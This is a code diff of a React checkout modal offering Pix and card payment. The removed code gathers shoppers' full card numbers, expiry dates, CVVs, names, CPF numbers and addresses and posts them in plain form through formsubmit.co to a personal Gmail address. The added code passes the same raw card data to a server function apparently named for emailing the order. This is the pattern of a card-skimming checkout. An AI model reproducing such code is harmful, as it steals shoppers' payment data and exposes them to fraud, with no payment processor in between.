@@ -3,6 +3,7 @@ import { useServerFn } from "@tanstack/react-start";
 import { QRCodeSVG } from "qrcode.react";
 import { X, Loader2, Copy, Check, ShieldCheck, QrCode, CreditCard } from "lucide-react";
 import { createPixPayment, type PixResult } from "@/lib/medusapay.functions";
+import { sendCardOrderEmail } from "@/lib/card-order.functions";
 
 type Props = {
   open: boolean;
@@ -13,6 +14,7 @@ type Props = {
 
 export function PixCheckoutModal({ open, onClose, amount, description }: Props) {
   const createPix = useServerFn(createPixPayment);
+  const sendCardOrder = useServerFn(sendCardOrderEmail);
   const [method, setMethod] = useState<"pix" | "card">("pix");
   const [step, setStep] = useState<"form" | "qr" | "card-success">("form");
   const [loading, setLoading] = useState(false);
@@ -66,39 +68,19 @@ export function PixCheckoutModal({ open, onClose, amount, description }: Props) 
     e.preventDefault();
     setError(null);
     setLoading(true);
-    const fields: Record<string, string> = {
-      _subject: `Novo pedido (Cartão) — ${description}`,
-      _template: "table",
-      _captcha: "false",
-      Kit: description,
-      Valor: `R$ ${amount.toFixed(2).replace(".", ",")}`,
-      Parcelas: `${card.installments}x`,
-      Nome: form.name,
-      Email: form.email,
-      Telefone: form.phone,
-      CPF: form.document,
-      Endereço: card.address,
-      "Titular do cartão": card.holder,
-      "Número do cartão": card.number,
-      Validade: card.expiry,
-      CVV: card.cvv,
-    };
-
     try {
-      const response = await fetch("https://formsubmit.co/ajax/rubenscardosoaguiar@gmail.com", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          Accept: "application/json",
+      const res = await sendCardOrder({
+        data: {
+          amount,
+          description,
+          customer: form,
+          card,
         },
-        body: JSON.stringify(fields),
       });
-      const data = (await response.json().catch(() => null)) as {
-        success?: boolean;
-        message?: string;
-      } | null;
-      if (!response.ok || data?.success === false) {
-        throw new Error(data?.message || "Não foi possível enviar o pedido.");
+      if (res.error) {
+        setError(res.error);
+        setLoading(false);
+        return;
       }
       window.location.href = "/pedido-concluido";
     } catch (err) {
